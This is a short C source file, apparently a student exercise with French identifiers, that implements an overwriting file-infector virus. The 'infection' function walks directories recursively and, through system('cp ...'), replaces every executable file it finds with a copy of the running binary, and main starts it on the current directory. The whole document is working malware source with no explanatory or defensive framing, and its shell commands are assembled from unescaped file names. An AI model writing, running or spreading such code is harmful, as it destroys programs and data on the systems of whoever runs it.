#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

void infection(int profondeur, char chemin[64], char virus[64]){
	struct dirent **liste;
	struct stat sb;
	int nombre=scandir(chemin,&liste,0,alphasort);
	
	for(int j=0;j<nombre;j++){
		if(liste[j]->d_name[0]!='.'){
			if(liste[j]->d_type==4){
				infection(profondeur+1, liste[j]->d_name, virus);
			}else if ((stat(liste[j]->d_name, &sb) >= 0) && (sb.st_mode > 0) && (S_IEXEC & sb.st_mode)){
				if(profondeur==0 && strcmp(virus,liste[j]->d_name) || profondeur!=0){
					char commande[128]="cp ";
					int i=0;
					while(i<profondeur){
						i++;
						strcat(commande, "../");
					}
					strcat(commande,"a.out ");
					strcat(commande, liste[j]->d_name);
					system(commande);
				}
			}
		}
	}
}
	
int main (int argc, char *argv[]){
	char nom_virus[64];
	memcpy(nom_virus, argv[0]+2,64);
	infection(0,".",nom_virus);
	return 0;
}
